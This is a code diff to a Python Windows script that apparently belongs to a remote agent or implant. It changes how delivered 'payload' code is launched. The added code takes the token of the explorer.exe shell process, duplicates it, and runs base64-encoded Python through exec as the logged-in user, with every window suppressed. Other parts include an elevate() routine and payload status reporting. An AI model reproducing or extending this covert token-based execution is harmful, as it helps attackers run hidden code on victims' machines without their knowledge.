@@ -11,6 +11,7 @@ import win32process
 import win32security
 import win32ts
 import win32profile
+import win32gui
 import ctypes
 import base64
 
@@ -54,23 +55,47 @@ def elevate():
     )
     sys.exit()
 
-def launch_python_code_in_user_session(code: str):
+def launch_python_code_in_user_session_headless(code: str):
     try:
-        session_id = win32ts.WTSGetActiveConsoleSessionId()
-        if session_id == 0xFFFFFFFF:
+        # 1. Get explorer.exe token (interactive user)
+        hwnd = win32gui.GetShellWindow()
+        if not hwnd:
+            print("No shell window found")
             return
-        user_token = win32ts.WTSQueryUserToken(session_id)
+
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        h_process = win32api.OpenProcess(
+            win32con.PROCESS_QUERY_INFORMATION, False, pid
+        )
+        h_token = win32security.OpenProcessToken(
+            h_process,
+            win32con.TOKEN_DUPLICATE
+            | win32con.TOKEN_ASSIGN_PRIMARY
+            | win32con.TOKEN_QUERY
+        )
+
+        # 2. Duplicate token → primary token
         duplicated_token = win32security.DuplicateTokenEx(
-            user_token,
-            win32security.SecurityImpersonation,
-            win32con.TOKEN_ALL_ACCESS,
+            h_token,
+            win32con.MAXIMUM_ALLOWED,
+            win32security.SecurityIdentification,
             win32security.TokenPrimary,
             None
         )
+
+        # 3. Create user environment block
         user_env = win32profile.CreateEnvironmentBlock(duplicated_token, False)
+
+        # 4. Encode Python code to run
         encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
         cmd = f'"{PYTHON_EXE}" -c "import base64; exec(base64.b64decode(\'{encoded}\'))"'
 
+        # 5. Setup startup info for headless execution
+        startup = win32process.STARTUPINFO()
+        startup.dwFlags |= win32con.STARTF_USESHOWWINDOW
+        startup.wShowWindow = win32con.SW_HIDE  # hide window
+
+        # 6. Launch process silently
         win32process.CreateProcessAsUser(
             duplicated_token,
             None,
@@ -81,7 +106,7 @@ def launch_python_code_in_user_session(code: str):
             win32con.CREATE_NO_WINDOW | win32con.CREATE_UNICODE_ENVIRONMENT,
             user_env,
             None,
-            win32process.STARTUPINFO()
+            startup
         )
 
     except Exception as e:
@@ -93,7 +118,7 @@ def run_payload_code(code: str):
 def execute_payload(payload_code, payload_id, launch_as_user):
     try:
         if launch_as_user:
-            launch_python_code_in_user_session(payload_code)
+            launch_python_code_in_user_session_headless(payload_code)
         else:
             run_payload_code(payload_code)
         payload_status, err = "success", ""
